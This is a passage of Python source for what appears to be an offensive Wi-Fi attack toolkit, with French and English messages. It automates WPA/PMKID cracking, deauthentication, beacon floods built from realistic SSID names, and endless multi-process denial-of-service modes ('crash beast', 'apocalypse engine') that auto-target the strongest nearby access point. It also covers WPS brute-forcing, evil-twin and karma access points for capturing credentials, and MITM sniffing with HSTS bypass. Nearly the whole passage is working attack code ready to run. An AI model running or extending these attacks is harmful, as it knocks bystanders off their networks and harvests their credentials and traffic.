    print(f"  Pour cracker : hashcat -m 22000 {master_hashfile} /path/to/wordlist")
    return master_hashfile

def crack_cap(cap_file, wordlist=None):
    if not os.path.exists(cap_file):
        err(f"File not found: {cap_file}")
        return
    header(f"CRACKING — {cap_file}")
    if not wordlist:
        if os.path.exists(ROCKYOU):
            wordlist = str(ROCKYOU)
            ok(f"Using default wordlist: {wordlist}")
        else:
            wordlist = ask("Path to wordlist")
    if not os.path.exists(wordlist):
        err(f"Wordlist not found: {wordlist}")
        return
    if shutil.which("aircrack-ng"):
        ok("Running aircrack-ng...")
        run(f"aircrack-ng {cap_file} -w {wordlist}", live=True)

def crack_pmkid(hc22000_file, wordlist=None):
    if not os.path.exists(hc22000_file):
        err(f"File not found: {hc22000_file}")
        return
    if not shutil.which("hashcat"):
        warn("hashcat not installed. Install: {}" .format(
            f"sudo {detect_package_manager() or '<PM>'} install -y hashcat"
            if detect_package_manager() else "hashcat"
        ))
        return
    header(f"CRACKING PMKID — {hc22000_file}")
    if not wordlist:
        if os.path.exists(ROCKYOU):
            wordlist = str(ROCKYOU)
        else:
            wordlist = ask("Path to wordlist")
    cmd = f"hashcat -m 22000 {hc22000_file} {wordlist} --force"
    print(f"\n  {C['DIM']}Mode 22000 = WPA-PBKDF2-PMKID+EAPOL{C['N']}")
    run(cmd, live=True)

def crack_john(cap_file, wordlist=None):
    require("john")
    header(f"JOHN CRACKING — {cap_file}")
    if not wordlist:
        wordlist = str(ROCKYOU) if os.path.exists(ROCKYOU) else ask("Path to wordlist")
    hccap_file = f"{cap_file}.hccap"
    run(f"hcxpcapngtool -o {hccap_file} {cap_file}", check=False)
    if shutil.which("wpapcap2john"):
        run(f"wpapcap2john {cap_file} > /tmp/alfa_john_hash")
        run(f"john --wordlist={wordlist} /tmp/alfa_john_hash", live=True)

def cowpatty_crack(cap_file, ssid, wordlist=None):
    require("cowpatty")
    header(f"COWPATTY CRACK — {ssid}")
    if not wordlist:
        wordlist = str(ROCKYOU) if os.path.exists(ROCKYOU) else ask("Path to wordlist")
    run(f"cowpatty -r {cap_file} -s '{ssid}' -f {wordlist}", live=True)

# ═══════════════════════════════════════════════════════════════
# DEAUTH & FLOOD (classiques)
# ═══════════════════════════════════════════════════════════════

def deauth(bssid, client=None, count=10, channel=None, rate=None):
    global _INJECTION_RATE
    require("aireplay-ng")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    if channel:
        set_channel(channel, iface)
    eff_rate = rate if rate is not None else _INJECTION_RATE
    if client:
        header(f"DEAUTH — {bssid} -> {client} ({count} packets)")
        cmd = f"aireplay-ng -0 {count} -a {bssid} -c {client} {iface}"
        if eff_rate:
            cmd += f" -x {eff_rate}"
        run(cmd, live=True)
    else:
        header(f"DEAUTH BROADCAST — {bssid} ({count} packets)")
        cmd = f"aireplay-ng -0 {count} -a {bssid} {iface}"
        if eff_rate:
            cmd += f" -x {eff_rate}"
        run(cmd, live=True)

REALISTIC_SSIDS = [
    "Starbucks WiFi", "McDonald's Free WiFi", "Airport WiFi", "Hotel WiFi",
    "iPhone", "AndroidAP", "XFINITY", "xfinitywifi", "SpectrumWiFi",
    "ATTWiFi", "linksys", "NETGEAR", "TP-Link", "ASUS", "D-Link",
    "Home WiFi", "MyWiFi", "WiFi Zone", "Free Internet", "Guest Network",
    "DIRECT-roku", "Chromecast", "Google WiFi", "Apple Store",
    "Starbucks", "Walmart WiFi", "Target Guest", "Library WiFi",
    "Cafe WiFi", "Restaurant WiFi", "Hotel Guest", "Free WiFi",
    "Office WiFi", "Corporate WiFi", "eduroam", "Airport Free WiFi",
    "iPhone (2)", "Pixel", "Galaxy S25", "MacBook Pro", "iPad",
    "HP-Print", "Brother Printer", "Canon Inkjet", "Roku", "Fire TV",
    "Ring Doorbell", "Nest Cam", "Alexa", "Google Home",
    "XFINITY Mobile", "Spectrum Mobile", "T-Mobile WiFi", "Verizon WiFi",
    "AT&T WiFi", "Cox WiFi", "Optimum WiFi", "Suddenlink WiFi",
    "Mediacom WiFi", "RCN WiFi", "WOW WiFi", "Consolidated WiFi",
    "Frontier WiFi", "Ziply WiFi", "MetroNet WiFi", "Ting WiFi",
    "Google Fiber WiFi", "Webpass WiFi", "Sonic WiFi", "Sonic Fiber WiFi",
    "MonkeyBrains WiFi", "Unwired WiFi", "Sierra WiFi", "DigitalPath WiFi",
    "HughesNet WiFi", "Viasat WiFi", "Starlink WiFi", "OneWeb WiFi",
    "Kuiper WiFi", "Telesat WiFi", "SpaceX WiFi", "Amazon WiFi",
    "Facebook WiFi", "Google WiFi", "Microsoft WiFi", "Apple WiFi",
    "Cisco WiFi", "Ubiquiti WiFi", "Ruckus WiFi", "Aruba WiFi",
    "Meraki WiFi", "Mist WiFi", "Juniper WiFi", "Extreme WiFi",
    "Alcatel-Lucent WiFi", "Nokia WiFi", "Ericsson WiFi", "Huawei WiFi",
    "ZTE WiFi", "Samsung WiFi", "LG WiFi", "Sony WiFi",
    "Panasonic WiFi", "Sharp WiFi", "Toshiba WiFi", "Hitachi WiFi",
    "Fujitsu WiFi", "NEC WiFi", "OKI WiFi", "Kyocera WiFi",
    "Ricoh WiFi", "Canon WiFi", "Epson WiFi", "Brother WiFi",
    "Dell WiFi", "HP WiFi", "Lenovo WiFi", "Acer WiFi",
    "Asus WiFi", "MSI WiFi", "Gigabyte WiFi", "Razer WiFi",
    "Corsair WiFi", "Logitech WiFi", "SteelSeries WiFi", "HyperX WiFi",
    "Plantronics WiFi", "Jabra WiFi", "Poly WiFi", "Sennheiser WiFi",
    "Bose WiFi", "Sonos WiFi", "Bowers & Wilkins WiFi", "Bang & Olufsen WiFi",
    "Harman Kardon WiFi", "JBL WiFi", "Infinity WiFi", "Harman WiFi",
]

def beacon_flood(count=100, ssid_file=None, channels="1,6,11", realistic=False):
    require("mdk4")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    if ssid_file:
        header(f"BEACON FLOOD — from file: {ssid_file} — channels {channels}")
        run(f"mdk4 {iface} b -f {ssid_file} -c {channels}", live=True)
    elif realistic:
        ssid_file = "/tmp/alfa_realistic_ssids.txt"
        with open(ssid_file, "w") as f:
            for s in REALISTIC_SSIDS[:count]:
                f.write(s + "\n")
        header(f"BEACON FLOOD — {count} realistic SSIDs — channels {channels}")
        print(f"  {C['Y']}Names like: Starbucks, iPhone, XFINITY, NETGEAR...{C['N']}")
        print(f"  {C['Y']}Channel hopping: {channels} — phones WILL see these{C['N']}")
        run(f"mdk4 {iface} b -f {ssid_file} -c {channels}", live=True)
    else:
        header(f"BEACON FLOOD — {count} random SSIDs — channels {channels}")
        run(f"mdk4 {iface} b -c {channels} -s {count}", live=True)

def beacon_flood_verify(count=200, channels="1,6,11", verify_sec=8):
    require("mdk4", "airodump-ng")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    ssid_file = "/tmp/alfa_realistic_ssids.txt"
    with open(ssid_file, "w") as f:
        for s in REALISTIC_SSIDS[:count]:
            f.write(s + "\n")
    header(f"BEACON FLOOD + VERIFY — {count} realistic SSIDs — channels {channels}")
    import threading
    def do_flood():
        subprocess.run(
            f"mdk4 {iface} b -f {ssid_file} -c {channels}",
            shell=True, preexec_fn=os.setsid,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    flood_thread = threading.Thread(target=do_flood, daemon=True)
    flood_thread.start()
    time.sleep(2)
    print(f"\n  {C['G']}[FLOOD ACTIVE] Now verifying on wlan0...{C['N']}")
    r = subprocess.run(
        f"timeout {verify_sec} airodump-ng --band bg -w /tmp/alfa_verify --output-format csv wlan0",
        shell=True, capture_output=True, text=True, timeout=verify_sec + 5,
        env={**os.environ, "TERM": "dumb"}
    )
    try:
        with open("/tmp/alfa_verify-01.csv") as f:
            lines = f.readlines()
        ap_count = sum(1 for l in lines if l.strip() and not l.startswith("BSSID") and len(l.split(",")) > 10)
        print(f"\n  {C['G']}[VERIFY] {ap_count} fake APs visible on wlan0{C['N']}")
        if ap_count > 10:
            ok("Beacon flood verified — phones CAN see these networks!")
        else:
            warn("Low visible AP count. Try different channels or check tx power.")
    except Exception:
        warn("Could not verify (wlan0 may be busy)")
    try:
        print(f"  {C['Y']}(Ctrl+C to stop){C['N']}")
        while flood_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        os.system(f"pkill -9 -f 'mdk4' 2>/dev/null")

def flood_beast(channel=6, count=200, ssid_list=None, ssid_file=None):
    require("mdk4")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header("FLOOD BEAST — SATURATION PERMANENTE (LOOP INFINIE)")
    print(f"  {C['Y']}Canal : {channel}  •  Nombre de SSID : {count}")
    print(f"  {C['Y']}Le flood tournera jusqu'a Ctrl+C{C['N']}")
    ssid_file_path = ssid_file
    if not ssid_file_path:
        if ssid_list:
            ssid_file_path = "/tmp/alfa_beast_ssids_custom.txt"
            with open(ssid_file_path, "w") as f:
                for s in ssid_list[:count]:
                    f.write(s + "\n")
        else:
            ssid_file_path = "/tmp/alfa_beast_ssids.txt"
            all_ssids = REALISTIC_SSIDS * 3
            with open(ssid_file_path, "w") as f:
                for s in all_ssids[:count]:
                    f.write(s + "\n")
    ok(f"Fichier SSID : {ssid_file_path}")
    set_channel(channel, iface)
    print(f"\n  {C['G']} FLOOD BEAST ACTIF ! (loop infinie){C['N']}")
    print(f"  {C['Y']}  - {count} reseaux factices visibles")
    print(f"  {C['Y']}  - Canal {channel} (universel)")
    print(f"  {C['Y']}  - Redemarrage automatique en cas de crash")
    print(f"  {C['DIM']}(Appuyez sur Ctrl+C pour arreter et restaurer){C['N']}")
    while True:
        try:
            cmd = f"sudo mdk4 {iface} b -f {ssid_file_path} -c {channel} -s {count}"
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            warn(f"mdk4 crashe (code {e.returncode}) - redemarrage dans 2s...")
            time.sleep(2)
            os.system(f"sudo ip link set {iface} down")
            os.system(f"sudo iw dev {iface} set type monitor")
            os.system(f"sudo ip link set {iface} up")
            os.system(f"sudo iw dev {iface} set channel {channel}")
        except KeyboardInterrupt:
            print(f"\n  {C['Y']}[!] Arret demande...{C['N']}")
            break
        except Exception as e:
            err(f"Erreur inattendue : {e}")
            time.sleep(2)
            os.system(f"sudo ip link set {iface} down")
            os.system(f"sudo iw dev {iface} set type monitor")
            os.system(f"sudo ip link set {iface} up")
            os.system(f"sudo iw dev {iface} set channel {channel}")
    cleanup()

# ═══════════════════════════════════════════════════════════════
# AUTO‑TARGET : scanne et retourne la BSSID + canal du plus fort AP
# ═══════════════════════════════════════════════════════════════

def auto_target(scan_time=8):
    header("AUTO‑TARGET — Recherche du meilleur AP")
    print(f"  {C['Y']}Scan pendant {scan_time}s...{C['N']}")
    if not ensure_interface_ready():
        return None, None
    iface = choose_iface()
    tmp_file = "/tmp/alfa_auto_scan"
    proc = subprocess.Popen(
        f"sudo airodump-ng --band abg -w {tmp_file} --output-format csv {iface}",
        shell=True, preexec_fn=os.setsid,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(scan_time)
    os.killpg(os.getpgid(proc.pid), signal.SIGINT)
    time.sleep(1)
    csv_file = f"{tmp_file}-01.csv"
    if not os.path.exists(csv_file):
        warn("Aucune donnee de scan trouvee. Attaque sur toutes les BSSID.")
        return None, None

    best_bssid = None
    best_channel = None
    best_pwr = -999
    try:
        with open(csv_file, "r") as f:
            lines = f.readlines()
        for line in lines:
            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line):
                parts = line.split(',')
                if len(parts) >= 6:
                    bssid = parts[0].strip()
                    pwr_str = parts[3].strip()
                    ch_str = parts[4].strip()
                    if pwr_str and (pwr_str.lstrip('-').isdigit()):
                        pwr = int(pwr_str)
                        if ch_str and ch_str.isdigit():
                            ch = int(ch_str)
                            if 1 <= ch <= 165:
                                if pwr > best_pwr:
                                    best_pwr = pwr
                                    best_bssid = bssid
                                    best_channel = ch
    except Exception as e:
        warn(f"Erreur de parsing du scan : {e}")

    os.system(f"rm -f {tmp_file}-* 2>/dev/null")

    if best_bssid and best_channel:
        ok(f"Cible selectionnee : {best_bssid} (canal {best_channel}, signal {best_pwr} dBm)")
        return best_bssid, best_channel
    else:
        warn("Aucun AP valide trouve. Attaque sur toutes les BSSID sur le canal 6.")
        return None, 6

# ═══════════════════════════════════════════════════════════════
# CRASH BEAST — DoS massif (auth, deauth, eapol, beam, ultimate, jammer)
# ═══════════════════════════════════════════════════════════════

def crash_beast(channel=6, bssid=None, attack_type="auth", auto=False):
    if auto:
        bssid, channel = auto_target()
        if not bssid:
            channel = channel or 6
            bssid = None

    require("mdk4")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header(f"CRASH BEAST — {attack_type.upper()} — Canal {channel}")
    if bssid:
        print(f"  {C['Y']}Cible : {bssid}{C['N']}")
    else:
        print(f"  {C['Y']}Cible : toutes les bornes a portee{C['N']}")
    print(f"  {C['Y']}Attaque : {attack_type}{C['N']}")
    print(f"  {C['DIM']}Appuyez sur Ctrl+C pour arreter et restaurer.{C['N']}")

    set_channel(channel, iface)

    cmd_base = f"sudo mdk4 {iface}"
    attack_cmds = {
        "auth": f"{cmd_base} a -a {bssid}" if bssid else f"{cmd_base} a",
        "deauth": f"{cmd_base} d -a {bssid}" if bssid else f"{cmd_base} d",
        "eapol": f"{cmd_base} e -a {bssid}" if bssid else f"{cmd_base} e",
        "beam": f"{cmd_base} m -a {bssid}" if bssid else f"{cmd_base} m",
    }

    if attack_type == "ultimate":
        cmds = []
        if bssid:
            cmds = [f"{cmd_base} a -a {bssid}", f"{cmd_base} d -a {bssid}", f"{cmd_base} e -a {bssid}"]
        else:
            cmds = [f"{cmd_base} a", f"{cmd_base} d", f"{cmd_base} e"]
        print(f"  {C['R']}[!] ULTIMATE MODE : Auth + Deauth + Eapol en parallele{C['N']}")
        import threading
        def run_cmd(cmd):
            try:
                subprocess.run(cmd, shell=True, preexec_fn=os.setsid,
                               capture_output=True, text=True)
            except Exception as e:
                warn(f"mdk4 thread crash: {e}")
        threads = []
        for c in cmds:
            t = threading.Thread(target=run_cmd, args=(c,), daemon=True)
            t.start()
            threads.append(t)
        try:
            while any(t.is_alive() for t in threads):
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n  {C['Y']}[!] Arret demande...{C['N']}")
        finally:
            os.system("pkill -9 mdk4 2>/dev/null")
        cleanup()
        return

    if attack_type == "jammer":
        jcmds = []
        if bssid:
            jcmds = [f"{cmd_base} d -a {bssid} -m", f"{cmd_base} b -c {channel} -s 500"]
        else:
            jcmds = [f"{cmd_base} d -m", f"{cmd_base} b -c {channel} -s 500"]
        print(f"  {C['R']}[!] JAMMER MODE : Deauth + Beacon flood en parallele{C['N']}")
        import threading
        def run_cmd(cmd):
            subprocess.run(cmd, shell=True, preexec_fn=os.setsid)
        threads = []
        for c in jcmds:
            t = threading.Thread(target=run_cmd, args=(c,), daemon=True)
            t.start()
            threads.append(t)
        try:
            while any(t.is_alive() for t in threads):
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n  {C['Y']}[!] Arret demande...{C['N']}")
        finally:
            os.system("pkill -9 mdk4 2>/dev/null")
        cleanup()
        return

    cmd = attack_cmds.get(attack_type)
    if not cmd:
        err(f"Type d'attaque inconnu : {attack_type}")
        return

    while True:
        try:
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            warn(f"mdk4 crashe (code {e.returncode}) - redemarrage dans 2s...")
            time.sleep(2)
            os.system(f"sudo ip link set {iface} down")
            os.system(f"sudo iw dev {iface} set type monitor")
            os.system(f"sudo ip link set {iface} up")
            os.system(f"sudo iw dev {iface} set channel {channel}")
        except KeyboardInterrupt:
            print(f"\n  {C['Y']}[!] Arret demande...{C['N']}")
            break
        except Exception as e:
            err(f"Erreur inattendue : {e}")
            time.sleep(2)
            os.system(f"sudo ip link set {iface} down")
            os.system(f"sudo iw dev {iface} set type monitor")
            os.system(f"sudo ip link set {iface} up")
            os.system(f"sudo iw dev {iface} set channel {channel}")
    cleanup()

def multiplier_attack(channel=6, bssid=None, attack_type="auth", num_processes=50):
    require("mdk4")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header(f"MULTIPLIER — {num_processes} processus {attack_type.upper()} — Canal {channel}")
    if bssid:
        print(f"  {C['Y']}Cible : {bssid}{C['N']}")
    else:
        print(f"  {C['Y']}Cible : toutes les bornes a portee{C['N']}")
    print(f"  {C['Y']}Nombre de processus : {num_processes}{C['N']}")
    print(f"  {C['DIM']}(Appuyez sur Ctrl+C pour arreter et restaurer.){C['N']}")

    set_channel(channel, iface)

    cmd_base = f"sudo mdk4 {iface}"
    target = f" -a {bssid}" if bssid else ""
    attack_opts = {
        "auth": f"{cmd_base} a {target}",
        "deauth": f"{cmd_base} d {target}",
        "eapol": f"{cmd_base} e {target}",
        "beam": f"{cmd_base} m {target}",
    }
    base_cmd = attack_opts.get(attack_type)
    if not base_cmd:
        err(f"Type d'attaque inconnu : {attack_type}")
        return

    import threading
    def run_attack(cmd, idx):
        if attack_type in ["auth", "deauth", "eapol", "beam"]:
            final_cmd = f"{cmd} -m"
        else:
            final_cmd = cmd
        try:
            subprocess.run(final_cmd, shell=True, preexec_fn=os.setsid,
                           capture_output=True, text=True)
        except Exception as e:
            warn(f"mdk4 instance crash: {e}")

    processes = []
    for i in range(num_processes):
        t = threading.Thread(target=run_attack, args=(base_cmd, i), daemon=True)
        t.start()
        processes.append(t)
        time.sleep(0.02)

    ok(f"{num_processes} processus lances !")
    try:
        while any(t.is_alive() for t in processes):
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {C['Y']}[!] Arret demande...{C['N']}")
    finally:
        os.system("pkill -9 mdk4 2>/dev/null")
        cleanup()

# ═══════════════════════════════════════════════════════════════
# APOCALYPSE ENGINE — attaque intelligente et adaptative
# ═══════════════════════════════════════════════════════════════

def apocalypse_mode(target_bssid=None, channel=None):
    require("mdk4", "airodump-ng", "aireplay-ng")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header(" APOCALYPSE ENGINE — DoS adaptatif")

    if not target_bssid:
        print(f"  {C['Y']}Aucune BSSID specifiee. Recherche du meilleur candidat...{C['N']}")
        target_bssid, channel = auto_target(scan_time=6)
        if not target_bssid:
            warn("Aucun AP trouve. Attaque sur toutes les BSSID a portee.")
            target_bssid = None
            channel = 6
    else:
        if not channel:
            print(f"  {C['Y']}Recherche du canal pour {target_bssid}...{C['N']}")
            tmp_file = "/tmp/alfa_channel_scan"
            proc = subprocess.Popen(
                f"sudo timeout 6 airodump-ng --band abg -w {tmp_file} --output-format csv {iface}",
                shell=True, preexec_fn=os.setsid,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(6)
            os.killpg(os.getpgid(proc.pid), signal.SIGINT)
            time.sleep(1)
            csv_file = f"{tmp_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, "r") as f:
                    for line in f:
                        if target_bssid in line:
                            parts = line.split(',')
                            if len(parts) >= 5:
                                ch_str = parts[4].strip()
                                if ch_str and ch_str.isdigit():
                                    ch = int(ch_str)
                                    if 1 <= ch <= 165:
                                        channel = ch
                                        break
            os.system(f"rm -f {tmp_file}-* 2>/dev/null")
            if not channel:
                warn(f"Impossible de trouver le canal de {target_bssid}, utilisation du canal 6 par defaut.")
                channel = 6

    # Validation du canal
    if channel and (channel < 1 or channel > 165):
        warn(f"Canal invalide ({channel}), utilisation du canal 6.")
        channel = 6

    ok(f"Cible : {target_bssid if target_bssid else 'toutes les BSSID'} | Canal : {channel}")

    # Fingerprinting
    chipset = "unknown"
    if target_bssid:
        oui = target_bssid[:8].upper()
        oui_db = {
            "00:11:22": "Broadcom", "00:1A:2B": "Qualcomm", "00:23:45": "MediaTek",
            "00:50:F2": "Atheros", "00:24:7E": "Intel", "00:0C:E7": "Realtek",
            "00:1E:2A": "Ralink", "00:15:6D": "Apple", "00:1C:F0": "Cisco",
            "00:13:7B": "Netgear", "00:14:6C": "D-Link", "00:18:4D": "Buffalo",
        }
        for prefix, name in oui_db.items():
            if oui.startswith(prefix):
                chipset = name
                break
        ok(f"Chipset probable : {chipset}")

    attack_vectors = ["auth", "eapol", "beam", "x"]
    if chipset in ["Broadcom", "Qualcomm"]:
        attack_vectors.append("deauth")
    if chipset in ["MediaTek", "Realtek"]:
        attack_vectors.append("auth")

    if chipset in ["Broadcom", "Qualcomm"]:
        num_procs = 30
    elif chipset in ["MediaTek", "Realtek"]:
        num_procs = 40
    else:
        num_procs = 20
    if num_procs > 50:
        num_procs = 50
    print(f"  {C['Y']}Nombre de processus recommande : {num_procs}{C['N']}")
    num_procs = int(ask("Nombre de processus", str(num_procs)) or str(num_procs))

    ok(f"Lancement de l'Apocalypse Engine avec {num_procs} processus.")

    set_channel(channel, iface)

    import threading, random
    cmd_base = f"sudo mdk4 {iface}"
    commands = []
    for v in attack_vectors:
        if v == "auth":
            cmd = f"{cmd_base} a"
            if target_bssid:
                cmd += f" -a {target_bssid}"
            for _ in range(num_procs // 2):
                commands.append(cmd + " -m")
        elif v == "deauth":
            cmd = f"{cmd_base} d"
            if target_bssid:
                cmd += f" -a {target_bssid}"
            for _ in range(num_procs // 4):
                commands.append(cmd + " -m")
        elif v == "eapol":
            cmd = f"{cmd_base} e"
            if target_bssid:
                cmd += f" -a {target_bssid}"
            for _ in range(num_procs // 4):
                commands.append(cmd + " -m")
        elif v == "beam":
            cmd = f"{cmd_base} m"
            if target_bssid:
                cmd += f" -a {target_bssid}"
            for _ in range(num_procs // 8):
                commands.append(cmd)
        elif v == "x":
            cmd = f"{cmd_base} x"
            if target_bssid:
                cmd += f" -a {target_bssid}"
            for _ in range(num_procs // 8):
                commands.append(cmd + " -m")
    beacon_cmd = f"{cmd_base} b -c {channel} -s 200"
    commands.append(beacon_cmd)
    random.shuffle(commands)

    procs = []
    def run_cmd(cmd):
        subprocess.run(cmd, shell=True, preexec_fn=os.setsid)
    for cmd in commands[:num_procs]:
        t = threading.Thread(target=run_cmd, args=(cmd,), daemon=True)
        t.start()
        procs.append(t)
        time.sleep(0.05)
    ok(f"{len(procs)} processus lances. Surveillance en cours...")

    try:
        while True:
            time.sleep(5)
            if target_bssid:
                r = subprocess.run(
                    f"sudo timeout 3 airodump-ng --band abg -w /tmp/alfa_check --output-format csv {iface}",
                    shell=True, capture_output=True, text=True
                )
                found = False
                try:
                    with open("/tmp/alfa_check-01.csv", "r") as f:
                        for line in f:
                            if target_bssid in line:
                                found = True
                                break
                except (FileNotFoundError, PermissionError):
                    pass
                os.system("rm -f /tmp/alfa_check-* 2>/dev/null")
                if not found:
                    ok(f" Cible {target_bssid} a disparu ! L'attaque a reussi !")
                    break
                else:
                    print(f"  {C['G']}Cible toujours visible, on continue...{C['N']}")
    except KeyboardInterrupt:
        print(f"\n  {C['Y']}[!] Arret demande...{C['N']}")
    finally:
        os.system("pkill -9 mdk4 2>/dev/null")
        cleanup()

# ═══════════════════════════════════════════════════════════════
# OTHER FLOODS, WPS, EVIL TWIN, MITM, AUTOMATION, PHISHING, VPN...
# (Fonctions raccourcies - voir version précédente)
# ═══════════════════════════════════════════════════════════════

def auth_flood(bssid=None):
    require("mdk4")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    target = f"-a {bssid}" if bssid else ""
    header(f"AUTH FLOOD {'-> ' + bssid if bssid else '(all APs)'}")
    run(f"mdk4 {iface} a {target}", live=True)

def deauth_flood_all():
    require("mdk4")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header("DEAUTH FLOOD — ALL clients, ALL APs")
    warn("This is extremely disruptive. Use only on authorized targets!")
    run(f"mdk4 {iface} d", live=True)

def probe_flood():
    require("mdk4")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header("PROBE FLOOD")
    print("  Creating noise to confuse WiFi tracking/analytics")
    run(f"mdk4 {iface} p", live=True)

def wifi_jammer():
    require("mdk4")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header("FULL WiFi JAMMER")
    warn("Multi-vector disruption — deauth all + beacon spam")
    import threading
    def run_deauth():
        subprocess.run(f"mdk4 {iface} d", shell=True, preexec_fn=os.setsid)
    def run_beacon():
        subprocess.run(f"mdk4 {iface} b -c 1 -s 500", shell=True, preexec_fn=os.setsid)
    t1 = threading.Thread(target=run_deauth, daemon=True)
    t2 = threading.Thread(target=run_beacon, daemon=True)
    t1.start(); t2.start()
    try:
        while t1.is_alive() or t2.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {C['Y']}[!] Stopping jammer...{C['N']}")
    finally:
        os.system("pkill -9 -f 'mdk4' 2>/dev/null")

def wps_reaver(bssid, channel, interface=None):
    require("reaver")
    if not ensure_interface_ready():
        return
    iface = interface or choose_iface()
    set_channel(channel, iface)
    header(f"WPS REAVER — {bssid} ch{channel}")
    prefix = f"{OUT_DIR}/reaver_{bssid.replace(':', '')}"
    ensure_dir()
    run(f"reaver -i {iface} -b {bssid} -c {channel} -vv -o {prefix}.txt", live=True)

def wps_bully(bssid, channel, interface=None):
    require("bully")
    if not ensure_interface_ready():
        return
    iface = interface or choose_iface()
    set_channel(channel, iface)
    header(f"WPS BULLY — {bssid} ch{channel}")
    run(f"bully {iface} -b {bssid} -c {channel} -vv", live=True)

def wps_pixie(bssid, channel, interface=None):
    require("reaver", "pixiewps")
    if not ensure_interface_ready():
        return
    iface = interface or choose_iface()
    set_channel(channel, iface)
    header(f"WPS PIXIE DUST — {bssid} ch{channel}")
    print(f"  {C['Y']}Targets vulnerable Broadcom/Realtek chips with weak RNG{C['N']}")
    run(f"reaver -i {iface} -b {bssid} -c {channel} -K 1 -vv", live=True)

def evil_twin_airbase(target_ssid, channel=None):
    require("airbase-ng")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    ch = channel or 6
    set_channel(ch, iface)
    header(f"EVIL TWIN — '{target_ssid}' via airbase-ng")
    print(f"  {C['Y']}Clients will connect to your fake AP{C['N']}")
    print(f"  To harvest creds, also run a DHCP server + captive portal")
    run(f"airbase-ng -e '{target_ssid}' -c {ch} {iface}", live=True)

def evil_twin_karma(channel=None):
    require("airbase-ng")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    ch = channel or 6
    set_channel(ch, iface)
    header(f"KARMA ATTACK — ch{ch}")
    print(f"  {C['Y']}Responds to ANY probe request — devices auto-connect{C['N']}")
    run(f"airbase-ng -P -C 30 -c {ch} {iface}", live=True)

def evil_twin_hostapd(ssid, channel=6, capture_creds=False):
    require("hostapd", "dnsmasq")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header(f"EVIL TWIN AP — '{ssid}' (hostapd + DHCP)")
    hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode={'a' if channel > 14 else 'g'}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
    with open(HOSTAPD_CONF, "w") as f:
        f.write(hostapd_conf)
    dnsmasq_conf = f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
port=5353
"""
    with open(DNSMASQ_CONF, "w") as f:
        f.write(dnsmasq_conf)
    run(f"dnsmasq -C {DNSMASQ_CONF}", live=False)
    run(f"ip addr add 10.0.0.1/24 dev {iface}", check=False)
    print(f"\n  {C['G']}AP ready on {ssid}{C['N']}")
    print(f"  Clients get IPs from 10.0.0.10-250")
    print(f"  Run a captive portal or wireshark to capture traffic")
    try:
        run(f"hostapd {HOSTAPD_CONF}", live=True)
    finally:
        run(f"pkill dnsmasq", check=False)
        run(f"ip addr del 10.0.0.1/24 dev {iface}", check=False)

def evil_twin_wpe(ssid, channel=6):
    if not shutil.which("hostapd-wpe"):
        warn("hostapd-wpe not installed — try: yay -S hostapd-wpe")
        return
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header(f"ENTERPRISE EVIL TWIN — '{ssid}' (hostapd-wpe)")
    print(f"  {C['Y']}Captures MSCHAPv2 challenges -> crackable for domain creds{C['N']}")
    run(f"hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf", live=True)

def mitm_bettercap(interface=None):
    if not shutil.which("bettercap"):
        warn("bettercap not installed. Install: {}" .format(
            f"sudo {detect_package_manager() or '<PM>'} install -y bettercap"
            if detect_package_manager() else "bettercap"
        ))
        return
    iface = interface or IFACE
    header(f"BETTERCAP MITM — {iface}")
    print(f"  {C['Y']}SSDP/ARP spoofing + HTTP(S) sniffing + HSTS bypass{C['N']}")
    run("bettercap -eval 'net.probe on; net.recon on; http.proxy on; https.proxy on'", live=True)

def auto_wifite():
    require("wifite")
    if not ensure_interface_ready():
        return
    header("AUTO-PWN — wifite")
    print(f"  {C['Y']}Automated: scan -> WPS -> WPA -> crack -> report{C['N']}")
    run("wifite --kill --random-mac", live=True)

def auto_chain(bssid, channel, wordlist=None):
    header(f"AUTO-CHAIN — {bssid} ch{channel}")
    ensure_dir()
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    set_channel(channel, iface)
    prefix = f"{OUT_DIR}/auto_{bssid.replace(':', '')}"
    import threading
    cap_done = threading.Event()
    def do_capture():
        subprocess.run(
            f"airodump-ng -c {channel} --bssid {bssid} -w {prefix} {iface}",
            shell=True, preexec_fn=os.setsid,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cap_done.set()
    cap_thread = threading.Thread(target=do_capture, daemon=True)
    cap_thread.start()
    time.sleep(2)
    print(f"\n  {C['Y']}[1/3] Capturing on {bssid}...{C['N']}")
    print(f"  {C['Y']}[2/3] Sending deauth...{C['N']}")
